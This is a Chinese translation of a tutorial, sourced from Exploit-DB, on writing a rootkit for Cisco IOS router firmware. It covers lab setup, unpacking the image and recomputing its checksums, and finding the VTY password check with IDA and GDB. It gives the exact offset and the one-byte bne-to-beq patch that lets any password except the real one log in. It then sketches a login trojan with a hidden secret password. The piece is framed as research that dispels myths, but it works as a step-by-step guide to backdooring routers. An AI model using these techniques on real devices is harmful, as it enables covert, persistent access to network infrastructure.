# Cisco IOS Rootkit工具该怎么写

文章来源：https://www.exploit-db.com/docs/38466.pdf

0x01 介绍
=====

本文主要以Cisco IOS为测试案例，讲解了如何对固件镜像进行修改。大多数人认为，做这样的一件事需要掌握一些尖端的知识，或者需要一些国家级别的资源，而事实上，这是一种普遍的误解。我认为，人们之所以这样想的一个主要原因是没有文章或教程完整地介绍过这一过程，也没有说明写一个rootkit都需要哪些资源。但是，本文的出现改变了这一现状。围绕这一主题，本文中提供了一些非常完善的方法，并完整地介绍了整个过程，同时也提供了相关的所需知识。如果读者能看完全文，他们最后就能写出一个基础的，但是能发挥作用的固件rootkit工具。一旦你理解了所有的基本思路和代码，并结合一个工作模型的话，那么你自己就能够轻松地写出一个加载器代码，并通过动态的，内存贮存的模块来扩展核心加载器的功能。不过，本文不会探究这么深，首先，文中证明了如何通过修改IOS镜像中的某个字节，来允许除真正密码以外的任意密码来登录路由器。第二，文章说明了如何覆盖原有的函数调用，从而调用你自己的代码，这里用到的例子是一个登录进程木马，能允许你指定一个秘密的二级登录密码。只要你完全理解了本文，用不了一个月的时间，你就可以根据本文中的知识来创建一个在功能上比SYNful Knock型rootkit更强大的rootkit工具。实际上，写一个类似的rootkit并不需要国家级的资源或上百万美元的投入，也不需要高科技智囊团的参与。接下来你会发现，在这几十年中，地下论坛上到处都能看到木马固件的身影。

首先，我们看看专家们如何评价SYNful Knock：

―包括DeWalt在内的网络安全专家称，只有少量具备网络情报能力的国家才能够执行复杂的攻击活动来打击网络设备，比如路由器。具备这种能力的国家有中国，以色列，英国，俄罗斯和美国。  
―和我接下来写的一样，政府窃听机构一般会执行这类攻击活动。例如，我们知道NSA就很喜欢攻击路由器。如果必须要猜的话，我会猜这是NSA发动的一次漏洞利用活动。  
― 但是，这个工具的性质和灵活性清楚地表明了，这不是一群地下工作的黑客在窃取个人信息等等。当然不是说，这类黑客不具备相应的能力，只是说这些黑客不喜欢这样的方式而已。这次攻击更像是国家性质的，两个头号嫌疑犯分别是NSA和中国，因为他们有 “个人信息妄想症”。  
―事实上，考虑到逆向ROMmon镜像的复杂程度，以及不借助0-day漏洞来安装镜像的难度，这次攻击活动的幕后黑手更可能是国家性质的。

据某些专家们所说，木马固件需要投入上百万美元的资金，政府资源和政府机密信息。这样的一个rootkit至少需要研究一周的PowerPC汇编，研究一周的反汇编，研究一周的代码编写和调试。照这样来看的话，我和很多其他人一样，已经能写一个需要10年版本的rootkit了（虽然，我只有不到5年的从业经验），而我们既不是某个国家也不是政府的智囊团。为了破除谣言-所谓的国家性质以及高超的安全研究知识，我们决定向科研社区证明，一个人如何能相对简单地利用自己的固件来创建一个rootkit工具。

0x02 设置
=====

HT文本编辑器:

```
apt-get install ht hexedit 
Dynamips + GDB Stub: git clone https://github.com/Groundworkstech/dynamips-gdb-mod 

```

程序员计算器:

```
http://pcalc.sourceforge.net/ 
Binutils / Essentials: apt-get install gcc gdb build-essential binutils \ binutils-powerpc-linux-gnu binutils-multiarch 

```

其他依赖项:

```
apt-get install libpcap-dev uml-utilities libelf-dev libelf1 
QEMU: apt-get install qemu qemu-common qemuctl qemu-system \qemu-system-mips qemu-system-misc qemu-system-ppc qemu-system-x86 

```

Debian PowerPC 镜像:

```
wget https://people.debian.org/~aurel32/qemu/powerpc/debian_wheezy_powerpc_standard.qcow2 

```

QEME还需要下面的额外设置：

```
# cd /usr/share/qemu/
# mkdir ../openbios/
# mkdir ../slof/
# mkdir ../openhackware/ # cd ../openbios/
# wget https://github.com/qemu/qemu/raw/master/pc-bios/openbios-ppc
# wget https://github.com/qemu/qemu/raw/master/pc-bios/openbios-sparc32 # wget https://github.com/qemu/qemu/raw/master/pc-bios/openbios-sparc64
# cd ../openhackware/
# wget https://github.com/qemu/qemu/raw/master/pc-bios/ppc_rom.bin # cd ../slof/
# wget https://github.com/qemu/qemu/raw/master/pc-bios/slof.bin
# wget https://github.com/qemu/qemu/raw/master/pc-bios/spapr-rtas.bin

```

QEME客户机应如下设置：

```
qemu-host# qemu-system-ppc -m 768 -hda debian_wheezy_powerpc_standard.qcow2
qemu-guest# apt-get update
qemu-guest# apt-get install openssh-server gcc gdb build-essential binutils-multiarch binutils qemu-guest# vi /etc/ssh/sshd_config
qemu-guest# GatewayPorts yes
qemu-guest# /etc/init.d/ssh restart
qemu-guest# ssh -R 22222:localhost:22 <you>@<qemu-host>

```

把你的开发设备SSH到端口22222，并作为根用户登录到QEMU客户机。这样在编辑文件，进行复制和粘贴操作时会更容易，因为不需要切换到QEMU窗口上。

Dynamips + GDB Stub需要进行编译。接下来的操作也需要在amd64机器上进行：更改配置以满足开发设备的要求。

```
# git clone https://github.com/Groundworkstech/dynamips-gdb-mod Cloning into 'dynamips-gdb-mod'...
remote: Counting objects: 290, done.
remote: Total 290 (delta 0), reused 0 (delta 0), pack-reused 290 Receiving objects: 100% (290/290), 631.30 KiB | 0 bytes/s, done. Resolving deltas: 100% (73/73), done.
Checking connectivity... done.
# cd dynamips-gdb-mod/src
# DYNAMIPS_ARCH=amd64 make
Linking rom2c
cc: error: /usr/lib/libelf.a: No such file or directory make: *** [rom2c] Error 1
# updatedb
# locate libelf.a /usr/lib/x86_64-linux-gnu/libelf.a
# cat Makefile |grep "/usr/lib/libelf.a"
LIBS=-L/usr/lib -L. -ldl /usr/lib/libelf.a $(PTHREAD_LIBS)
LIBS=-L. -ldl /usr/lib/libelf.a -lpthread
# cat Makefile | sed -e 's#/usr/lib/libelf.a#/usr/lib/x86_64-linux-gnu/libelf.a#g' >Makefile.1
# mv Makefile Makefile.bak
# mv Makefile.1 Makefile
# DYNAMIPS_ARCH=amd64 make

```

接下来，我们需要使用一个简单的脚本来计算二进制的校验和，因为随后我们还会用到这些二进制。把校验和保存到chksum.pl文件中，并放到开发目录下。通过chmod +x把这个文件转换成一个可执行文件。

```
#!/usr/bin/perl
sub checksum {
my $file = $_[0];
open(F, "< $file") or die "Unable to open $file ";
print "\n[!] Calculating the checksum for file $file\n\n"; 
binmode(F);
my $len = (stat($file))[7];
my $words = $len / 4;
print "[*] Bytes: \t$len\n";
print "[*] Words: \t$words\n";
printf "[*] Hex: \t0x%08lx\n",$len;
my $cs = 0;
my ($rsize, $buff, @wordbuf);
for(;$words; $words -= $rsize) {
$rsize = $words < 16384 ? $words : 16384;
read F, $buff, 4*$rsize or die "Can't read file $file : $!\n";
 @wordbuf = unpack "N*",$buff;
foreach (@wordbuf) {
$cs += $_;
$cs = ($cs + 1) % (0x10000 * 0x10000) if $cs > 0xffffffff; 
}
}
printf "[*] Checksum: \t0x%lx\n\n",$cs; 
return (sprintf("%lx", $cs));
close(F);
}
if ($#ARGV + 1 != 1) {
print "\nUsage: ./chksum.pl <file>\n\n"; 
exit;
} 
checksum($ARGV[0]);

```

另外还有几个资源也是必需的，但是我们无法在文章中给出链接。不过，你应该能找到这些资源，并且在设置上也不会遇到任何问题。接着，你需要把这些资源安装到用于开发的虚拟机上，然后创建一个Windows7客户机。一旦你完成了设置，就登录到你的Windows虚拟机，并安装“IDA Pro 6.6 + Hex-Rays Decompiler”或其他的任意版本——确保你安装的是完整版，能支持x86/x64以外的架构，因为我们主要使用的是PowerPC汇编语言。请不要破解IDA软件，IDA是一款非常好用的程序，值的我们的购买。

最后，你需要一个IOS镜像。我们使用的镜像来自我们购买的Cisco 2600，文件名是 “c2600-bino3s3-mz.123-22.bin”。我们强烈建议你登录你的Cisco账户，然后下载这一个镜像-使用同一个镜像能保证你完全根据我们的要求进行操作，并且偏移、校验和、长度等也都是一致的。众所周知，在一些社区中下载到的一些所谓“仅供学习”的IOS镜像，以及具有更多功能的IOS镜像，实际上都植入了木马。除了通过哈希来验证，我们还建议你使用FX的‘Cisco Incident Response’来验证你的IOS镜像。

对于我们的开发设备，提示是 "[3812149161f@decay ]# “；QEMU请求，提示是"[debian@ppc ]#。

0x03 开发
=====

使用下面的解压命令就可以解压IOS镜像-c2600-bino3s3-mz.123-22.bin：

```
[ 3812149161f@decay ]# unzip c2600-bino3s3-mz.123-22.bin
Archive: c2600-bino3s3-mz.123-22.bin
warning [c2600-bino3s3-mz.123-22.bin]: 16876 extra bytes at beginning or within zipfile
(attempting to process anyway) 
inflating: C2600-BI.BIN

```

===========================

= IOS BIN结构 =
=============

[ELF标头 ]  
[SFX ]  
[0xfeedface ]  
[未压缩的镜像大小 ]  
[压缩后的镜像大小 ]  
[压缩后的镜像校验和 ]  
[未压缩的镜像校验和 ]

[PKzip数据 ]
==========

关于IOS BIN的结构，有几点非常重要的地方。首先，这基本上就是一个包含了几个标头的ZIP文件；几乎所有的解压程序都能找到zip数据是从哪里开始的，并解压。最开始是一个用于描述二进制的标头，除了机器变量以外，其他的二进制你都不需要担心；接着是一个自解压的可执行程序，除了大小变量，你也不用了解太多；然后就是zip数据。最后，在解压后，在你能够把文件加载到IDA之前，你必须修改ELF标头的e_machine标记。你可以通过解压c2600-bino3s3-mz.123-22.bin，来完成这一操作，这样留给你的会是C2600-BI.BIN 。把这个文件从C2600-BI.BIN复制到C2600-BI.BIN.ida，然后在ht/hte (ht /path/to/C2600-BI.BIN.ida)中打开文件，点击对话框中的 “OK”：

![](http://static.wooyun.org//drops/20160420/2016042013312657315.com/blob/zrhaaaawpzs/idghzndffgttgutwpbyu4q?s=xirkabyyk7my)

然后，按下F6，在模型中选择EF标头，向下滚动到machine项目上-上面会显示SPARC v9 64-bit-按下F4进行编辑，输入0014，现在按下F2保存，并按下F10退出。现在，你就能够把BIN加载到IDA了。*注意：在一些虚拟机上，`ht`就是`hte`，你想要的是十六进制编辑器，而不是文本处理-无论如何，在本文中，我们会使用`ht`来处理二进制，但是在在你的机器上，其名称可能是`hte`。

现在，你已经获取到了c2600-bino3s3-mz.123-22.bin、 C2600-BI.BIN.ida和 d C2600-BI.BIN，在ht中打开c2600-bino3s3-mz.123-22.bin，点击对话框中的 “OK”，然后按下F7进行搜索。向下切换到十六进制，并输入 “fe ed fa ce”，接着按回车，这个魔术值就能识别各种位元信息，比如大小和校验和。

![](http://static.wooyun.org//drops/20160420/2016042008341645197.com/blob/zrhaaaawpzs/lhzzqov5bk3hyf9oitujqa?s=xirkabyyk7my)

除了“fe ed fa ce”，如果你想要重建完整的IOS压缩镜像的话，你还必须要知道如何计算和操作另外的几个重要值：

02 65 e2 8c : 未压缩的镜像大小  
00 eb 1e bb : 压缩后的镜像大小  
ed a0 3a 8b : 压缩后的镜像校验和  
7c 5c c4 27 : 未压缩的镜像校验和

一旦你确定了这些值的位置，你就在ht中按下F10退出。按照这些值，你就能找到用于识别PKZipped标头数据的魔术值 “PK”。这些值及其位置都很重要，并且接下来也会发挥作用。另外，理解这些值是怎样计算的也非常重要。首先，我们要找到压缩镜像和未压缩镜像的长度。

![](http://static.wooyun.org//drops/20160420/2016042013312969124.com/blob/zrhaaaawpzs/8wyfwbxsqwy0fv0emkuujg?s=xirkabyyk7my)

前往从我们在魔术值0xfeedface后面的字节中看到的值：

```
[ 3812149161f@decay ]# pcalc 0x0265e28c  # 02 65 e2 8c : 未压缩的镜像大小 
            40231564 0x265e28c           0y10011001011110001010001100
[ 3812149161f@decay ]# pcalc 0x00eb1ebb  # 00 eb 1e bb : 压缩后的镜像大小
            15408827 0xeb1ebb      0y111010110001111010111011
[ 3812149161f@decay ]# pcalc 15408827 - 15425704 ; 标头大小减去`ls`输出的大小 
       -16877        0xffffffffffffbe13

```

记住解压警告：

```
警告： [c2600-bino3s3-mz.123-22.bin]: 在开头或zip文件内存在16876个额外字节

```

我们要找到压缩后镜像和未压缩镜像的校验和

![](http://static.wooyun.org//drops/20160420/2016042008341949520.com/blob/zrhaaaawpzs/rcmebcw4rpm-jiacyckbza?s=xirkabyyk7my)

[!] 计算文件C2600-BI.BIN的校验和

![](http://static.wooyun.org//drops/20160420/2016042009475710562.com/blob/zrhaaaawpzs/kn05zcveaad1lf_o923z3q?s=xirkabyyk7my)

要想获取压缩文件的校验和，也就是zip数据，就用标头减去`dd`，记住 “额外”数据有16876个字节。

![](http://static.wooyun.org//drops/20160420/2016042012583511151.com/blob/zrhaaaawpzs/ro2_w_qyqpivhmwntuhsfq?s=xirkabyyk7my)

[!] 计算文件c2600-bino3s3-mz.123-22.bin.no_header 的校验和

![](http://static.wooyun.org//drops/20160420/2016042008342484890.com/blob/zrhaaaawpzs/kv9__7wl-txkzvrsrderdq?s=xirkabyyk7my)

因为随后我们需要这个值来重建IOS二进制，所以我们需要一个标头副本。这个值应该是16876减去16字节，这16个字节是每个4字节上的4个值需要的，分别是压缩后的镜像大小，未压缩的镜像大小，压缩后的镜像校验和，以及未压缩的镜像校验和。

![](http://static.wooyun.org//drops/20160420/2016042008342619934.com/blob/zrhaaaawpzs/yraqudf_rlehw7tftlpl5a?s=xirkabyyk7my)

到目前为止：我们已经取得了一个包含有多个标头和zip数据的c2600-bino3s3-mz.123-22.bin文件，解压后的C2600-BI.BIN镜像，修改了e_machine标记的C2600-BI.BIN.ida文件，以及剥离了标头的c2600-bino3s3- mz.123-22.bin.no_header文件。并且，我们还知道了魔术值0xfeedface的位置，明白了如何计算十六进制值，也清楚了要把这些十六进制值放到哪里，如果必要的话，需要手动完成。最后，要想把BIN加载到IDA，我们必须把e_machine Elf标头值从002d（SPARC）更改为0014（PowerPC）。

然后，取出C2600-BI.BIN.ida，修改这个C2600-BI.BIN.ida文件的ELF e_machine标头，接着把这个文件放到Windows虚拟机上的IDA中。当然，你也可以重新压缩这个文件，再获取一个新的C2600-BI.BIN-只是确保你取出的文件已经把e_machine标记设置为了0014。打开IDA（32位），选择New，把你的处理器设置成PowerPC Bif-Endian [PPC]，然后一直等到IDA完成加载。

在IDA加载文件的过程中，如果你尝试远程登录一台Cisco设备，你就会看到提示，要求你输入 “密码”，如果你输错好几次，你就会看到错误信息 "%% Bad passwords\n”。在这里就要用到关于反汇编的基础知识了。我们接下来要查找一些字符串，找到XREF（交叉引用）的suo'yo子例程，并观察那个函数。

在IDA完成加载后，点击IDA-View-A tab，然后在窗口中的任意位置单击，并按下 ‘g’（或使用文本搜索）。当我们已经确定了在对话框中如何操作后，打开类型aBadPasswords，并单击“OK”。你应该会看到下图中的内容：

![](http://static.wooyun.org//drops/20160420/2016042008342855947.com/blob/zrhaaaawpzs/wvnbl73ya5jbdlc-m_eqlw?s=xirkabyyk7my)

如果你没有找到图中的内容，你可以在IDA中按下’g'来尝试文本搜索，或者是因为，IDA还没有分析完二进制。如果你查看左下角，这里的数字应该不会跳动。一直等到数字停止跳动时，IDA会提示你更改浏览模式-这时候就代表着IDA就完成分析了。

在这个可执行文件的只读数据部分中，我们在.rodata:81a414f8上发现了字符串 “Password”：随后正好是.rodata:81a41504，在这里我们发现了我们在查找的"%% Bad passwords\n”字符串。双击XREF字，选择查找 “Password”字符串，然后你就会被带到这里：

![](http://static.wooyun.org//drops/20160420/2016042008343051318.com/blob/zrhaaaawpzs/qtly4jyobcvumeouxjepcg?s=xirkabyyk7my)

在我们继续之前，现在要回顾一些关于PowerPC汇编语言的基础知识。只要你稍微了解一些汇编语言，那么你也就能大体明白是什么意思了，只是要记住下面的几点：

PowerPC指令 OP rX, rY, rZ，例如，如果 OP 是 ADD ，然后是ADD ，然后： rX = rY + rZ，如果OP是 SUB，然后：rX=rY–rZ。

大多数指令的操作顺序是从右到左，并且根据你的汇编器和调试工具，它们的范围可以是2到4个寄存器。比如，一个对比指令可以写作cmp crfD, L, rA, rB，也就是cmp cr7, 0, r3, r4 或 cmp r3, r4。网络上有很多关于PowerPC汇编语言的在线教程。

几乎所有的指令都是从右到左地操作，除了存储操作，这类指令的操作顺序是从左到右。例如，把寄存器r3中某个数据的某个字（32b）储存到栈：

```
stw %r3, 0x0(%sp)

```

一些关于 PowerPC 汇编的基础知识：总共有32个寄存器，r0-r32，其中有几个很特殊的。连接寄存器中包含有后继指令地址，这样当被调用的函数完成所有操作后，函数就会知道要把执行返回到什么位置。例如，如果你有一个分支（branch）和链接（link）`bl _my_function`，其作用就像是x86上的`ret`，`bl _my_function`会提取出`bl _my_function`指令的开始地址，加4，并把结果储存到连接寄存器；然后jmp到 _my_function。在 _my_function中，`bl _my_function`会调用mflr %rX-从连接寄存器移动到寄存器rX，并保存，...运行整个_my_function，并且最后调用 mtlr %rX-移动到连接寄存器，然后调用一个blr-连接寄存器上的分支。这样可以从 %rX中提取出已经保存的连接寄存器地址，然后调用连接寄存器上的分支-也就是说，把程序计数器设置到连接寄存器中储存的地址。

bl _my_function  
cmp %r3, 0

stw %rX, memY ：所有的 stw* 操作代码都是用于储存数据，并且从左向右执行。 lwz %r4, -0xc(%sp)：所有的 lw* 操作代码都是为了加载数据，并且从右向左执行。%r1 和 %sp 是同一回事；基本上，r1 就是一个虚假的栈指针。函数的返回值通常会放到r3中，并且r3经常用作函数的第一个参数，接下来是r4，r5，r6 ...

你可在大部分的操作代码上设置条件寄存器，通过附上期限的方式；例如：

```
0000 xor. %r4, %r4, %r4     # r4 = 0, 并设置一个条件寄存器
0001 bnel _strcmp           # 不跳转，但是保存LR- 分支用于不会正确
0002 mflr %r4               # 将*这个* 地址 (0002) 移动到 r4
0004 addi %r4, %r4, 8       # (# 从mflr开始的行)*4 ; 现在 r4 指向了字符串
0005 .ascii "Iminlovewithamaliciousintent" 0006 .long 0x0

```

再次说一下，网上有很多关于PowerPC汇编的在线教程。目前，你只需要大概清楚我们在干什么就可以。任何时候只要使用b*1来调用函数时，结尾的1指的就是把连接寄存器设置为调用指令后的下一个指令的值。然后，使用函数中的blr-连接寄存器上的分支，返回使用连接寄存器，也是通过告诉函数应该在哪里设置程序计数器。mflr-移出连接寄存器-每当你想要保存连接寄存器的时候，你可以调用mflr %rX，函数就会把连接寄存器保存到rX。mtlr-移动到连接寄存器，你可以设置mtlr，然后调用blr并跳转到这个地址，无论是相对地址还是绝对地址。mr-移动寄存器，也是从右向左操作。因为所有的指令都是4字节或1个字，所以，你需要两条指令才能在PowerPC上把一个32位的值加载成一个字。完成这项操作的方式有很多，但是最普遍的还是：

![](http://static.wooyun.org//drops/20160420/2016042023042318645.com/blob/zrhaaaawpzs/sxetuum3zhxtzrhldrz5qq?s=xirkabyyk7my)

现在，r4=0x80008000。大部分的操作代码会使用一个w来指代字，或用b来指代字节，用z来指代零填充，用i指代立刻，或者是综合使用。知道了这些就足够理解下面的操作了。

返回到IDA，双击DATA XREF：sub_803BD4C0+38，开始观察loc_803bd4f4上的函数；函数把一个0加载到了r30，然后把“Password:”字符串的大写字节加载到了r27。在下面的loc_803bd4fc上，小写字节储存到了r6，所以我们可以推测，下一个被调用的函数就会显示这个字符串。如果，这是一个登录函数，我们只需要用两步就跳出这个函数：当r3等于0时， beq loc_803bd540会进入另一部分，获取传递到函数（addi r3, r1, 0x70+var_68）的某个值，接着提取另外的两个r4和r5。我们接下来就要仔细地观察这个函数，其开始代码是`addi r3, r1, 0x70+var_68`。接下来，当返回的r3不等于0时，我们就跳出了函数调用`bl sub_80385070`。

![](http://static.wooyun.org//drops/20160420/2016042008343422269.com/blob/zrhaaaawpzs/ghlynrvcmsy_ok_szvi5fq?s=xirkabyyk7my)

要想把地址从IDA转换到objdump ，首先用objdump来处理这个文件，并找到代码的开始位置：

![](http://static.wooyun.org//drops/20160420/2016042008343711630.com/blob/zrhaaaawpzs/rcthmkam_jigqbj2fija2w?s=xirkabyyk7my)

在这个二进制中，代码是从0x60开始的，取出这个地址，减去0x80008000的基址，再加上0x60，这样你就获得了你的objdump地址。需要记住的是，这个0x60是从哪里来的，因为在接下来，我们还会多次用到这个地址。

![](http://static.wooyun.org//drops/20160420/2016042008344084990.com/blob/zrhaaaawpzs/fer2szm028mo9z2obdgp5w?s=xirkabyyk7my)

并且，要想把地址从objdump逆向回IDA，需要用objdump的地址加上基址0x80008000，然后减去0x60：

![](http://static.wooyun.org//drops/20160420/2016042009480132628.com/blob/zrhaaaawpzs/vkjw6o0bxidcda_cipl1nq?s=xirkabyyk7my)

如果你想使用objdump来查找位置或地址，只用记住objdump输出中小写的信息，以及IDA中大写的信息，这样就能通过objdump来查找地址了（最多使用几个句子的字节）：

![](http://static.wooyun.org//drops/20160420/2016042008344369209.com/blob/zrhaaaawpzs/4ifukj6oouhze6jbl2m78q?s=xirkabyyk7my)

现在我们要打开PowerPC QEMU，一个窗口运行我们基于PowerPC的Debian镜像，在另一个窗口中运行配置有GDB stub的Dynamips，然后通过QEMU中的GDB来远程调试Dynamips IOS实例。

在Dynamips中，我们会在端口6666上启动GDB stub，并且设置一个tap 1接口，这样我们就能通过虚拟网络与虚拟路由器通讯了。

```
[ 3812149161f@decay ]# tunctl -t tap1
[ 3812149161f@decay ]# ifconfig tap1 up
[ 3812149161f@decay ]# ifconfig tap1 192.168.9.1/24
[ 3812149161f@decay ]# ./dynamips-gdb-mod/dynamips -Z 6666 -j -P 2600 -t 2621 -s 0:0:tap:tap1 -s 0:1:linux_eth:eth0 /path/to/C2600-BI.BIN
Cisco Router Simulation Platform (version 0.2.8-RC2-amd64) Copyright (c) 2005-2007 Christophe Fillot.
Build date: Sep 21 2015 00:35:24
IOS image file: /path/to/C2600-BI.BIN ILT: loaded table "mips64j" from cache. ILT: loaded table "mips64e" from cache. ILT: loaded table "ppc32j" from cache. ILT: loaded table "ppc32e" from cache. C2600 instance 'default' (id 0):
VM Status : 0
RAM size : 64 Mb
NVRAM size : 128 Kb
IOS image : /path/to/C2600-BI.BIN
Loading BAT registers
Loading ELF file '/path/to/C2600-BI.BIN'...
ELF entry point: 0x80008000
C2600 'default': starting simulation (CPU0 IA=0xfff00100), JIT disabled. GDB Server listening on port 6666.

```

打开另一个终端窗口，并运行QEMU：

```
[ 3812149161f@decay ]# qemu-system-ppc -m 768 -hda debian_wheezy_powerpc_standard.qcow2

```

一旦启动并作为根用户登录：root并执行前面提到的SSH端口转发，因为这样这样能更方便地与虚拟机通讯了。只要你登录了（无论是哪种方式），就打开GDB并连接到Dynamips实例（X.X.X.X 是运行Dynamips的IP地址）：

```
[debian@ppc ] # gdb -q
(gdb) target remote X.X.X.X:6666 
Remote debugging using X.X.X.X:6666 
0xfff00100 in ?? ()
(gdb)

```

此时，Dynamips正在运行IOS，在端口6666上还有一个调试stub，并且我们也连接到了PowerPC Debian虚拟机。接下来，首先从我们认为的函数起始位置开始，也就是在IDA-视图 A中突出显示的那一行`addi r3, r1, 0x70+var_68`，然后在十六进制视图下观察这个地址，在这里是0x803bd528，在GDB中观察这个地址，并验证你是否是在同一个端口中。

在IDA中对比指令和地址：

![](http://static.wooyun.org//drops/20160420/2016042008344780750.com/blob/zrhaaaawpzs/jt_32jcddgmpqe3hmlhcta?s=xirkabyyk7my)

在GDB中发现的指令和地址：

![](http://static.wooyun.org//drops/20160420/2016042008344994033.com/blob/zrhaaaawpzs/sqrcziqkpywvwxinxc0yna?s=xirkabyyk7my)

在不同的调试工具中，操作代码看起来也是不一样，无论你使用的是什么版本的调试程序，适应了就好。看起来像是在同一个位置上，所以你需要： 1. 在接口上设置一个IP地址，并在VTY线路上设置一个密码 2. 保存路由器配置 3. 保证你可以从用于开发的虚拟机上ping到路由器上 4. 在bl 0x81b68928中的0x803bd534位置上设置一个断点，这样我们就能看到r3，r4和r5中的内容了

从GDB实例中，在b *0x803bd534命令的所在位置上设置一个断点，然后输入'c'或'continue' ，这样Dynamips中的路由器实例就可以继续启动了，接着切换回Dynamips窗口，只要路由器启动完成，就输入基本配置。

![](http://static.wooyun.org//drops/20160420/2016042008345218129.com/blob/zrhaaaawpzs/hudubjqjn3iywmohypsd4w?s=xirkabyyk7my)

现在，从你的主host上，尝试通过telnet登录路由器。如果你一直按照要求并使用了同一个IOS镜像，当你输入了路由器密码并按下回车键时，窗口会冻结，同时在GDB窗口中会遇到断点。*注意：你的寄存器地址和你在这里看到的一般是不同的。

![](http://static.wooyun.org//drops/20160420/2016042008345571049.com/blob/zrhaaaawpzs/bsekdcjjofm5utv3jsj-ow?s=xirkabyyk7my)

在断点上，我们可以观察这些用作调用函数参数的寄存器，第一个是r3，第二个是r4，第三个是r5，等等。在r3中有我们输入的密码，而在r4中是我们寻找的真正密码和登录函数。然后，在r3上是一个对比操作：

![](http://static.wooyun.org//drops/20160420/2016042008345846429.com/blob/zrhaaaawpzs/ezcxrntuikynd4setbgr8q?s=xirkabyyk7my)

如果值不匹配（“分支不相等”branch not equal），函数就会前进到0x803bd4ec。在分支指令上设置断点，并观察r3：

![](http://static.wooyun.org//drops/20160420/2016042008350178088.com/blob/zrhaaaawpzs/vljkgjyiqciiwswwow7plq?s=xirkabyyk7my)

因为我们输入的密码不正确，并且r3的值是0，现在我们知道了要想登录成功，这个值必须不相等。在GDB中按下 ‘c'，然后返回telnet窗口，这次输入正确的密码，按下回车，并返回到GDB窗口。

![](http://static.wooyun.org//drops/20160420/2016042009480347076.com/blob/zrhaaaawpzs/xkld0qohushtl6xb2advvw?s=xirkabyyk7my)

现在，我们成功登录了。对于木马来说，可能只会简单地获取其他的部分来看看密码是否是正确的，而不会检查 “分支不相等”，我们把这个条件改为了 “分支相等”，这样的话，除了正确密码以外的任何密码都能奏效。现在和一字节登录绕过一样。按下ctrl+c, 'q', 'y’退出GDB。

![](http://static.wooyun.org//drops/20160420/2016042008350411168.com/blob/zrhaaaawpzs/5fof2t2szutqeng2anex5a?s=xirkabyyk7my)

我们想要找到objdump指令（bne），这样的话我们就可以用ht来编辑指令，修改其对比测试。返回到IDA，把鼠标移动到`bne loc_803bd4ec`上，然后在十六进制视图下查看。复制整行：

```
803BD53C 40 82 FF B0 80 1F 01 50 70 09 02 00 40 82 00 1C

```

用0x803bd53c的地址位置偏移减去Cisco基址 0x80008000，再加上0x60 objdump输出中代码的起始位置偏移。

```
[ 3812149161f@decay ]# pcalc 0x803BD53C - 0x80008000 + 0x60     

3888540 0x3b559c 0y1110110101010110011100

```

我们想要修改的位置就是二进制文件中的0x3b559c地址。首先，我们必须找到操作代码，只用在QEMU虚拟机上写一个简单的汇编程序就行。为了更好的理解我们要查找的这个操作代码：

![](http://static.wooyun.org//drops/20160420/2016042008350647447.com/blob/zrhaaaawpzs/su0usdfy-e_dfer0kao_ja?s=xirkabyyk7my)

前6个字节是我们的操作代码。所以，我们需要写一对儿简单的汇编程序，一个用bne指令（分支不相等），另一个用beq指令（当分支相等时）。

![](http://static.wooyun.org//drops/20160420/2016042012583729817.com/blob/zrhaaaawpzs/kk90-ec5nxqn1otjysiy7g?s=xirkabyyk7my)

操作代码是前6位-0100 00或0x40。现在，我们要使用相同的方法来查找beq的操作代码：

![](http://static.wooyun.org//drops/20160420/2016042009480627513.com/blob/zrhaaaawpzs/cv9zh8ocmvbwfqcbmbu5hq?s=xirkabyyk7my)

在这里，我们能看到bne操作代码（分支不相等）是0x40，而bep操作代码（当分支相等时）是0x41。我们知道bne指令的位置是 0x3b559c，在ht中打开C2600-BI.BIN，并把0x40修改为0x41。

```
[ 3812149161f@decay ]# ht C2600-BI.BIN

```

按下F5，并输入0x3b559c

![](http://static.wooyun.org//drops/20160420/2016042008351269301.com/blob/zrhaaaawpzs/qcqoeim6pl8ert1vs6nqlw?s=xirkabyyk7my)

一定要让鼠标指针停在40上，按下F4进行编辑，把40更改成41，按下F2保存，然后按F10退出。现在把文件再加载回Dynamips，通过GDB连接到文件，并验证修改是不是生效了。

![](http://static.wooyun.org//drops/20160420/2016042008351432586.com/blob/zrhaaaawpzs/m5k-xtkv7yrc2ucqgdxgwa?s=xirkabyyk7my)

我们可以看到，地址 0x803bd53c上的指令确实已经从bne 0x803bd4ec更改到了beq 0x803bd4ec，也就是说，除了真正的密码，输入其他任何的密码都能够访问到路由器。再次按下’c’，并允许路由器继续启动。一旦启动完成，你就可以使用任意的密码来登录路由器了。为了证明这一点，我写了一个简单的Expect脚本，这样你就能在屏幕上看到路由器正在接收什么密码。

![](http://static.wooyun.org//drops/20160420/2016042008345571049.com/blob/zrhaaaawpzs/bsekdcjjofm5utv3jsj-ow?s=xirkabyyk7my)

然后，使用这个脚本我们就能连接到路由器。我这样做只是为了能看到发送到路由器上并被路由器接收的密码，因为如果不使用这个脚本，屏幕上什么信息都不会显示。另外一点是，在使用这个脚本的时候，真正的密码也能发挥作用，但是就不能使用telnet登录了。原因是这个脚本会发送额外的字符作为一个新的换行符，这个换行符在接收后会作为密码，你能看到第一次尝试失败了，然后接收了第二次尝试。

![](http://static.wooyun.org//drops/20160420/2016042008351995215.com/blob/zrhaaaawpzs/qtr7jz_a2oepir46cvup6g?s=xirkabyyk7my)

此时，我们已经首次成功修改了IOS二进制，允许我们使用任何密码来登录到VTY线路上，当然除了真正的密码。虽然，我们已经很好地证明了修改ISO二进制是可能的，但是还远没有达到能在真实环境中应用的级别。现在我们要写一些实际的东西，计划如下：

我们会在只读数据区（.rodata）中找到一个足够大的位置来存放我们的汇编代码，我们会使用我们自己编译的代码来覆盖那里的字符串，然后把放置二进制修改的区域更改成可执行的。接下来，我们会使用自己的函数来替换密码检查函数，密码检查函数执行的是一个简单的字符串对比，比较的是我们在汇编程序中编译的静态密码，如果对比结果是匹配，就会向密码检查函数返回一个成功；如果不匹配，则修复真正函数的所有参数，然后再调用真正的函数。

把木马版的 C2600-BI.BIN保存成另外一个名称，再次解压c2600-bino3s3-mz.123-22.bin以获取新鲜的C2600-BI.BIN。我们接下来就要修改这个文件（*注意确保使用的是最新获取的C2600-BI.BIN）：

![](http://static.wooyun.org//drops/20160420/2016042009480895254.com/blob/zrhaaaawpzs/ssr5n-him31paoishkt0kg?s=xirkabyyk7my)

